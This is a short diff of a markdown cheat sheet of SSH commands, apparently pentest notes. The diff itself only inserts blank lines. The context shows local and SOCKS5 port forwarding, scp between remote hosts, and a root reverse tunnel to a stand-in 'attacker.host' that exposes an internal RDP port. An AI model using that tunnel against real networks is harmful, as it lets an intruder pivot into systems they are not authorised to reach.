@@ -5,12 +5,14 @@
 ```ssh -l root -t -t -R 3389:10.10.10.1:3398 attacker.host```
 
 ```ssh -i id_rsa.key -L6969:machine.to.touch:80 machine.for.proxy```
+
 -----
 
 
 #### port forward SOCKS5
 
 ```ssh -D 5555 user@yourserver.com -p 5555```
+
 -----
 
 
@@ -27,5 +29,6 @@
 *Remote host A to remote host B*
 
 ```scp username@host-a.com:/host_a/dir/file.zip username@host-b.com:/host_b/dir/file.zip```
+
 -----
 
